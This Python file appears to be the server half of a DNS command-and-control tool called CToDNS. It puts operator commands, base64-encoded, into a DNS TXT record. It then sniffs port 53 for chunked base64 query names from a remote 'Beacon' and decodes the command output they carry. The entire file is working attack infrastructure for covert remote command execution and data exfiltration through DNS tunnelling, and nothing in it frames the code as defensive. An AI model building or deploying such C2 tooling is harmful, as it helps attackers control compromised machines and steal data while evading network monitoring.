import subprocess
import base64
from scapy.all import sniff, DNS
from termcolor import colored  

DNS_SERVER = "X.X.X.X"
DOMAIN = "your_domain.co.il"

def print_banner():
    """
    Prints the banner at the start of the program.
    """
    banner = """
  ____ _____     ____  _   _ ____
 / ___|_   _|__ |  _ \| \ | / ___|
| |     | |/ _ \| | | |  \| \___ \
| |___  | | (_) | |_| | |\  |___) |
 \____| |_|\___/|____/|_| \_|____/
"""
    print(colored(banner, "cyan", attrs=["bold"]))
    print(colored("By ShkudW", "yellow", attrs=["bold"]))
    print(colored("https://github.com/ShkudW/CToDNS", "yellow", attrs=["bold"]))
    print("\n")

def update_txt_record(encoded_command):
    """
    Update a TXT record dynamically using nsupdate.
    """
    nsupdate_cmds = f"""
server {DNS_SERVER}
update delete {DOMAIN} TXT
update add {DOMAIN} 60 TXT "{encoded_command}"
send
"""
    try:
        subprocess.run(
            ["nsupdate"], input=nsupdate_cmds, text=True, capture_output=True, check=True
        )
    except subprocess.CalledProcessError as e:
        log(f"Failed to update TXT record: {e.stderr}", "ERROR")

def sync_bind():
    """
    Synchronize BIND server to write updates to the zone file.
    """
    try:
        subprocess.run(["rndc", "sync"], check=True)
    except subprocess.CalledProcessError as e:
        log(f"Failed to synchronize BIND: {e.stderr}", "ERROR")

def decode_chunk_data(query_name):
    """
    Extract and decode the Base64 chunk from the DNS query name.
    """
    try:
        chunk_data = query_name.split("-")[1].split(".")[0]
        return chunk_data
    except IndexError:
        log(f"Failed to extract chunk data from query: {query_name}", "ERROR")
        return None

def log(message, level="INFO"):
    """
    Log messages based on the level.
    """
    if level == "INFO":
        print(message)
    elif level == "ERROR":
        print(colored(f"ERROR: {message}", "red"))

def listen_for_dns_packets():
    """
    Listen for incoming DNS packets and handle chunks.
    """
    chunks = {}
    unique_id = None
    expected_chunks = 0

    log(colored("Listening for DNS packets...", "cyan", attrs=["bold"]))
    while True:
        packet = sniff(filter="udp port 53", count=1, timeout=60)[0]
        if packet and packet.haslayer(DNS) and packet[DNS].qd:
            query_name = packet[DNS].qd.qname.decode()

            if "start" in query_name:
                unique_id = query_name.split("-")[0]
            elif "chunks" in query_name:
                try:
                    expected_chunks = int(query_name.split("-")[0].replace("chunks", ""))
                except ValueError:
                    continue
            elif "chunk" in query_name:
                try:
                    chunk_index = int(query_name.split("-")[0].replace("chunk", ""))
                    chunk_data = decode_chunk_data(query_name)
                    if chunk_data:
                        chunks[chunk_index] = chunk_data
                except Exception as e:
                    log(f"Failed to process chunk: {e}", "ERROR")
            elif "end" in query_name:
                if len(chunks) == expected_chunks:
                    try:
                        
                        sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
                        full_data = "".join(sorted_chunks)

                        # Add padding to Base64 data if needed
                        missing_padding = len(full_data) % 4
                        if missing_padding:
                            full_data += "=" * (4 - missing_padding)

                        decoded_output = base64.b64decode(full_data).decode()

                       
                        cleaned_output = decoded_output.split("|", 1)[-1].strip()

                        print(
                            colored(
                                f"\nDecoded output from Beacon:\n{cleaned_output}\n",
                                "green",
                                attrs=["bold"],
                            )
                        )
                        chunks.clear()
                        expected_chunks = 0
                        break  # Exit listening loop for next command
                    except Exception as e:
                        log(f"Error decoding or assembling chunks: {e}", "ERROR")
                        chunks.clear()
                        expected_chunks = 0
                else:
                    log(f"Incomplete chunks received. Expected {expected_chunks}, got {len(chunks)}.", "ERROR")

if __name__ == "__main__":
    print_banner()  
    log(colored("C2 Server Started. Type 'exit' to quit.", "yellow", attrs=["bold"]))
    while True:
        try:
            command = input("\nEnter command to execute: ")
            if command.lower() == "exit":
                log(colored("Exiting C2 Server.", "yellow", attrs=["bold"]))
                break

            encoded_command = base64.b64encode(command.encode()).decode()
            update_txt_record(encoded_command)
            sync_bind()  

            listen_for_dns_packets()
        except KeyboardInterrupt:
            log(colored("\nExiting C2 Server.", "yellow", attrs=["bold"]))
            break
